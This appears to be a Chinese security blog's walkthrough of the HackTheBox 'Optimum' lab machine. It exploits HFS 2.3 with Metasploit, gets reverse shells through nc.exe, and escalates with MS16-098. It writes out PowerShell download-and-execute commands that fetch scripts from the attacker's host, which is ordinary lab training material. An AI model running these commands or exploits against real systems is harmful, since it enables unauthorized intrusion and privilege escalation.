> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/oF656YuFyaIdaIZeJk4GXA)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **56** 篇文章，本公众号会每日分享攻防渗透技术给大家。HackTheBox-windows-Optimum-Walkthrough

![](https://mmbiz.qpic.cn/mmbiz_png/RKmmCHT73fdQQ2nv9rDeddIlJk71QWHcslefZEPQxvuVzXNn9ZlY6dicKOiaJQBXNFYkbHtUsOw0duN5FIUuItSA/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/6

靶机难度：中等（4.7/10）

靶机发布日期：2017 年 10 月 3 日

靶机描述：

Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete. 

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/xVzbJNmGHSCH5d0fX1bHZYbyKoFLsiapvaq5K6Oo80wFkVAmt04DEn4DSiagPY4oL5QTcTlFhJZsA5mbTUZTJFYQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/jRoggJ2RF3BHibojhJQ8jmNderYtvTh8HkyBLp8nlK1B262IP84ZEic7el5hZ1rSy2RRjsGUQxdSGiaPFGG66pA8FnblLMZNWzA/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/jJSbu4Te5ib8dv7tckM3eiau36jYD6r6JzUadPhLfh5pBPkc7MXuibrLRyxucMXeHZMwuc8YJbmickBgMbiaNAGWJ6u8K69OmxYXp/640?wx_fmt=svg)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJc2iaKAjmU12zyLFOWYvSib2LzC8a6BDEAlyBRxXtg1libicRia0lA0zT3o4Q/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.8，windows 系统的靶机...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJc1f5vdwYxhOvKNxLnKfS7ED4Dntiavsic15CURwxLu7sCoFs1asXBawFQ/640?wx_fmt=png)

nmap 发现只开了 80 端口，HttpFileServer httpd 2.3Web 服务器...（HFS（Http 文件服务器）是一种文件共享软件，可让您发送和接收文件）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJc9X6Ih8nFzzbyq3XxuAg2mibIGZ9ibZ6MerAPR7CBlhkf5MaKFEaY1qag/640?wx_fmt=png)

这边我查看下存在的漏洞利用试试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJciaw2upNe3j5y4Quys0ibZ5E2l7PFIIxy6XW3XqI67eVAl2VxWBD86kUA/640?wx_fmt=png)

可以利用

```
exploit/windows/http/rejetto_hfs_exec
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcicB8mVicSnqSfcLRgQhV6USMnPzLrTzn994xT30ShySq4hBqERWPM7QQ/640?wx_fmt=png)

执行即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcZ4BOqOefo4nbTwgPNp0NKSvJnaItCJATcMkP4aLYuheoDTFoqAEibaA/640?wx_fmt=png)

可以看到获得了低权 shell... 这里发现 OPTIMUM 运行的是 x64 体系结构...Meterpreter 是 X86 的，需要改成 x64... 修改下 paylod...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJchGJRpTq63D8tmBTrt46D2Yibp6yroxEIjpZ6Flw7gHdwhpxS9z09S1Q/640?wx_fmt=png)

修改好后执行即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcW2ODhpx1ePkd0MZvhLicF6IEVcTveIJy54bekVGKnm8VAvZvDdcDmaw/640?wx_fmt=png)

已成功改过来... 开始查找 user

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcTXdxsxBg7iaxJYOz3aefApaxPDMHmVkJdbMZaHlIiciaxQO86lBVzKCQQ/640?wx_fmt=png)

这边成功查看到 user.txt（不公布了自己玩）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcE1oZnku2ibgto1Bclf2QuYLSyKcqiaPg6QLXrQPlTlricfhMrib3jNOPibw/640?wx_fmt=png)

果然，还是低权状态，无法进入 administrator... 这边直接使用 Metasploit 进行权限升级...

![](https://mmbiz.qpic.cn/mmbiz_svg/jRoggJ2RF3BHibojhJQ8jmNderYtvTh8HkyBLp8nlK1B262IP84ZEic7el5hZ1rSy2RRjsGUQxdSGiaPFGG66pA8FnblLMZNWzA/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/jJSbu4Te5ib8dv7tckM3eiau36jYD6r6JzUadPhLfh5pBPkc7MXuibrLRyxucMXeHZMwuc8YJbmickBgMbiaNAGWJ6u8K69OmxYXp/640?wx_fmt=svg)

使用 Metasploit 进行权限升级

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

这里利用：

```
use post/multi/recon/local_exploit_suggester
```

建立 session...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcibNuQxqQQuU05OXogEAD7yzqqUNSJ3ulosYmWiah2nBtC0hFicn4sy72g/640?wx_fmt=png)

这里通过 session2 进行，但是等待了会未成功...

继续想别路...

前面就查看到了它是 Windows 2012 R2... 经过谷歌查询发现可利用

```
[ms16_032](https://www.rapid7.com/db/modules/exploit/windows/local/ms16_032_secondary_logon_handle_privesc)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcODxoWV3rZ0EJ2tteoMpUSEZXwgpFjon0R3whSiaE2Bhia7uRm6NJa53w/640?wx_fmt=png)

利用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcjlicJsk9Ms68Qs0HVDGEibnKclicmbicWbm4umCRah4LmfdS1heBbyxjow/640?wx_fmt=png)

选择会话... 然后选择 payload...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcfDnAkkGNs4HPMrNalOBrYByT3VRwLrjCyj84C2PvB4fDGUDxVibsm1g/640?wx_fmt=png)

执行即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcM3jeibJYFsuSZGnWialHJtbMyOzkcG6r5eI1yexkkdoETC8wP9tPh5uw/640?wx_fmt=png)

执行完后，发现还是不起作用... 另想别的方法...

![](https://mmbiz.qpic.cn/mmbiz_svg/jRoggJ2RF3BHibojhJQ8jmNderYtvTh8HkyBLp8nlK1B262IP84ZEic7el5hZ1rSy2RRjsGUQxdSGiaPFGG66pA8FnblLMZNWzA/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/jJSbu4Te5ib8dv7tckM3eiau36jYD6r6JzUadPhLfh5pBPkc7MXuibrLRyxucMXeHZMwuc8YJbmickBgMbiaNAGWJ6u8K69OmxYXp/640?wx_fmt=svg)

利用 NC 创建一个低特权反向 shell

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcJzDmks4aC2DIecBVpGgMhfLdc6dBicozZsjk8LibSs02cDDZibOeAVzMA/640?wx_fmt=png)

前面 80 端口扫描就发现是 2.3 的 HFS，这里我都查看下这两个的内容...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcmaP3b6CSibcaibiclkPAIAzHLLMyjhC1kyWfLcubvSY6g0svFlb0VxQAA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcZs0rqgeibj21NUiaWFHqw65evD0Lh2mL6Q8NQXcOUrsgAaG63ajsA1xw/640?wx_fmt=png)

可以看到这里更依赖于 Web 服务器下载来利用 nc.exe 获取反向 Shell...

需要使用托管 netcat 的 Web 服务器：

```
http://<attackers_ip>:80/nc.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcExH6D7sXW5nT1MKYuTph0M9G4ykPS3icMD23RbEQlCc5elvicBcbibYOw/640?wx_fmt=png)

和 shell 一样改成本地 kali 的 IP 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcoaOMyd3QK367cuto0a9OTUGbym8hR248bVgs4g4nqpbkiac4kesNxQg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcDI8ErlLjPlV1ibkFk5NYCfO4QYEFZLBArq5K18kequCFjZ6aGtice4xg/640?wx_fmt=png)

将 nc.exe 复制到文件夹中来...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJc0N7ibebHZ6QYuFgD49UlgXYY4tCasFs2XticePibZASBoRLMWOpNPFfAg/640?wx_fmt=png)

开启 python 服务，主要上传 NC 的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcoPEf7dYdqmBVzicSAUtWABwbuKuwqTm9rfVMfBjOnOKUxXgKWCCQZdA/640?wx_fmt=png)

这里利用了 Nect 机制进行本地提 shell...（Ncat 是一个功能丰富的网络实用程序，可从命令行跨网络读取和写入数据）

这边注意的是第三个窗口具有 python 漏洞利用程序必须得启用两次，一个触发 nc.exe，另一个触发反向 shell...

原理是：

python exploit（第 3 个窗口）将连接到 python 服务器（第 1 个窗口），以下载 nc.exe Windows 二进制文件，然后 nc.exe 在端口 443（第二个窗口）上连接回 Ncat 侦听器，并将创建一个低特权反向外壳程序...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcM3zic3GfOyfkvvwtviciaSurtVRnFN5XDB1lmTqkhv97xmOAgtjM1u9ww/640?wx_fmt=png)

继续获取 root.txt....

![](https://mmbiz.qpic.cn/mmbiz_svg/jRoggJ2RF3BHibojhJQ8jmNderYtvTh8HkyBLp8nlK1B262IP84ZEic7el5hZ1rSy2RRjsGUQxdSGiaPFGG66pA8FnblLMZNWzA/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/jJSbu4Te5ib8dv7tckM3eiau36jYD6r6JzUadPhLfh5pBPkc7MXuibrLRyxucMXeHZMwuc8YJbmickBgMbiaNAGWJ6u8K69OmxYXp/640?wx_fmt=svg)

使用 GDSSecurity / Windows-Exploit-Suggester 工具枚举 KB

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

这边运用 systeminfo 查看下 KB...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcFeFc9GnQPqVavR7bu904cwxCdVWP29lkhs93XLuicaSuGG1f9ZYiaLlw/640?wx_fmt=png)

这边使用 Windows-Exploit-Suggester 工具对目标补丁程序级别与 Microsoft 漏洞数据库进行比较，以检测目标上可能缺少的补丁程序...

```
[工具连接](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcMcwEFDr72UmuKyLHV7dOT9luGyibk7FhNzibQjI1DvibgU6zdWEcrZUfQ/640?wx_fmt=png)

讲解得很详细... 开始操作

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcJ9ARmGqfnsLtdjeRGK3tQuqIEiaHiaDBvXNRoas1iaRGLHuffibwlmBlbQ/640?wx_fmt=png)

按照要求将 ststeminfo 信息保存在 sysinfo.txt 下，以及将 windows.....py 文件放置本地...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcRKgBI9pKiaxlZ2ahdWQlXknWQuiandp4aXd3I68FvaT4C1hSqM6jRQJA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcPJvKI2GXTpJmqticmQnr91oBWD5YiaibfcUayCKvzDeKkria0DENK3nyJg/640?wx_fmt=png)

然后使用 --update 标志从 Microsoft 自动下载安全公告数据库的功能，并将其另存为 Excel 电子表格...

这里没用安装 xlrd 记得使用：

```
pip  install xlrd
```

进行安装...  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJckIcugvLZBxETe3oyLa0GPMxcDZgLmDbteAv8tEM7uJYicRMhpYH6tEA/640?wx_fmt=png)

```
python windows-exploit-suggester.py --systeminfo sysinfo.txt --database 2020-02-11-mssb.xls
```

可以看出补丁数量以及没打的补丁...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcRSsJFbLj0g6r4mniaqmConrdcjxyutUhdrJWYzribibZbynzJ1tkXHcuA/640?wx_fmt=png)

这边打算利用 ms16_032...

![](https://mmbiz.qpic.cn/mmbiz_svg/jRoggJ2RF3BHibojhJQ8jmNderYtvTh8HkyBLp8nlK1B262IP84ZEic7el5hZ1rSy2RRjsGUQxdSGiaPFGG66pA8FnblLMZNWzA/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/jJSbu4Te5ib8dv7tckM3eiau36jYD6r6JzUadPhLfh5pBPkc7MXuibrLRyxucMXeHZMwuc8YJbmickBgMbiaNAGWJ6u8K69OmxYXp/640?wx_fmt=svg)

使用 Sherlock 枚举 KB

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

将使用 Sherlock 枚举计算机上的 KB，这里利用 Sherlock 工具进行.....

```
（这里Sherlock是一个PowerShell脚本，可以快速查找缺少的软件补丁以解决本地特权升级漏洞...）[链接](https://github.com/rasta-mouse/Sherlock)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcJtpbicREyhp2BDJTsTrEIYWafBggeqg6I4gT6LdQUkachxQ9tTE707g/640?wx_fmt=png)

```
git clone https://github.com/rasta-mouse/Sherlock
```

下载到本地后...

继续更改文件 Sherlock.ps1 并在 Powershell 脚本的末尾添加 Find-Allvulns...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcnM2Vx6L05n6Duf2fiblTe74yetictLMUXGDH29LcUgaRNBjD4Ph1I8Cg/640?wx_fmt=png)

修改完后上传即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcIuQ5RxDa9cJryh5F5Z2T5vzOrWSicuQNOPyUAniaOick85xb5mjpqsGYA/640?wx_fmt=png)

```
powershell wget "http://10.10.14.20/Sherlock/Sherlock.ps1"
```

成功上传...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcXcWAQIP0ZjB0E3laYewwa6ht8d6exBWiaxQQ6f4hRDfWLt15IkLxhoQ/640?wx_fmt=png)

```
powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.20/Sherlock/Sherlock.ps1')
```

使用上面命令启动 Sherlock，进行遍历 windows 的所有 KB...

没发现有利用的，但是也是一种方式方法.....

![](https://mmbiz.qpic.cn/mmbiz_svg/jRoggJ2RF3BHibojhJQ8jmNderYtvTh8HkyBLp8nlK1B262IP84ZEic7el5hZ1rSy2RRjsGUQxdSGiaPFGG66pA8FnblLMZNWzA/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/jJSbu4Te5ib8dv7tckM3eiau36jYD6r6JzUadPhLfh5pBPkc7MXuibrLRyxucMXeHZMwuc8YJbmickBgMbiaNAGWJ6u8K69OmxYXp/640?wx_fmt=svg)

使用 RGNOBJ 整数溢出进行特权升级

![](https://mmbiz.qpic.cn/mmbiz_svg/Iic9WLWEQMg188DeVtNKRm1TKjRbm9lMO1Sn0Nxp4ub3M6m1ib29Pg42QpAsl2KtUhGicZIM8mBLAW0BTviaOLUdwnDUBNpqgNlQ/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/Ib5852jAyb9xjIOSr4AGdwHrOa5leGNTnFwkWXvaOsQMx7bVxQiabjjSeicggObSK25jW1K5mG6aNZia8VJuiaarScZkKOYlJP4a/640?wx_fmt=svg)

继续....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcMiaRj3qxycQBSObY2BsOicyatZrUAxR3ibkiaTicudT2dqDZQMwqJP9xibiaQ/640?wx_fmt=png)

查看 Microsoft 的文档，就会发现 Windows Server 2012 R2 与 Windows 8.1 相关，并且具有相同的内部版本号....

```
[链接](https://docs.microsoft.com/en-gb/windows/win32/sysinfo/operating-system-version?redirectedfrom=MSDN)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJc5jKfnHwBgzJtWaf4o9AnFn0rDVTS0yLgVcEKOmdibKxPfuEoorOyytg/640?wx_fmt=png)

通过谷歌发现可利用 ms16-098...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcVWvpCEv1r9ia9QicUByHIXUX0j4wNAJj8k09OKRSqAHbAVTZjPpPCstw/640?wx_fmt=png)

回顾到之前利用 Windows-Exploit-Suggester 工具发现的 KB 情况... 也发现了 Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098).....

继续利用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcc7DFI6jspE6yTHvRyicIdAEMgp5u9E5DFV1S2iapKV8xhLTbic0Jfw1ng/640?wx_fmt=png)

查看到可利用 41020.c，放入本目录.. 查看后可以看到该漏洞利用程序具有可使用的预编译 Windows 的二进制文件...41020.exe

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcWoy2JmhsMpM8PvNicPRFica0X987Re82r6fJkU63WbBUVmoeabmY3Hag/640?wx_fmt=png)

上传...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJciarp6ctoEXgBUOdowVibM2n0Y3HUlf304rnkzEoXWhqHx57Jzjsk6UUA/640?wx_fmt=png)

成功上传到了 windows...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcvG5AbD50t5Gw6vUDZu0HveBn2RdIjgwgl0icIDzeG0OI0QyiaLrY6JKg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNltMicaa5x60L5X99aeCRJcy8ljVvI7n4QgQpibvyhNpXYXbyFqNdicqJuVJQlTcTLKfSAWpudgzpvA/640?wx_fmt=png)

成功获得 root.txt 内容...

![](https://mmbiz.qpic.cn/mmbiz_png/RKmmCHT73fdQQ2nv9rDeddIlJk71QWHcslefZEPQxvuVzXNn9ZlY6dicKOiaJQBXNFYkbHtUsOw0duN5FIUuItSA/640?wx_fmt=png)

深夜凌晨文章！！！

学到了好多好多东西，我这里介绍了很多很多思路，对于 windows 渗透非常有用，加油！！！

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/xVzbJNmGHSCH5d0fX1bHZYbyKoFLsiapvaq5K6Oo80wFkVAmt04DEn4DSiagPY4oL5QTcTlFhJZsA5mbTUZTJFYQ/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)